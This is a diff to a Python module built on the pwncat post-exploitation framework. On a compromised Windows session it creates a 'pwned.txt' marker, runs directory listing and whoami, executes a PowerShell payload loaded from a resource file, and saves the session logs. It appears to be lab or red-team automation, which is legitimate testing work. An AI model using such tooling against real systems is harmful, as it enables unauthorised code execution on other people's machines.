@@ -71,8 +71,8 @@ class Module(BaseModule):
                     "All retries exhausted. Payload execution failed.")
                 return None
 
-            # get hostname for disk loggings
-            hostname = session.platform.getenv('HOSTNAME')
+            # get hostname for disk logging
+            hostname = session.platform.getenv('COMPUTERNAME')
 
             script_dir = os.path.dirname(os.path.realpath(__file__))
             session.log(f"script dir: {script_dir}")
@@ -89,11 +89,17 @@ class Module(BaseModule):
                 shutil.rmtree(task_path)
             task_path.mkdir(parents=True)
 
+            session.log("touch file: C:\Windows\Temp\pwned.txt")
+            session.platform.touch("C:\Windows\Temp\pwned.txt")
+            result = session.platform.listdir("C:\Windows\Temp")
+            session.log(f"list directory: {"\n".join(result)}")
+            result = session.platform.whoami()
+            session.log(f"whoami: {result}")
+
+            session.log(f"running default payload...")
             windows_default_payload = Path(
                 f"{script_dir}/../resources/windows_default_payload.ps1")
             payload = windows_default_payload.read_text()
-
-            # result = run_remote(session, default_payload)
             result = run_remote(session, payload)
             session.log(result)
 
@@ -103,14 +109,14 @@ class Module(BaseModule):
 
             session.log("Done.")
         except Exception as e:
-            session.log(f'Error executing bash script: {e}')
+            session.log(f'Error executing script: {e}')
             pass
 
         session.log("Backup pwncat.log...")
         pwncat_log = Path("/tmp/pwncat.log")
         if pwncat_log.exists():
             dest_log = Path(
-                f"/tmp/pwncat_session_{task_name}.log")
+                f"/tmp/pwncat_windows_session_{task_name}.log")
             session.log(
                 f"Copying session log {pwncat_log.as_posix()} => {dest_log.as_posix()}")
             source = pwncat_log.read_bytes()
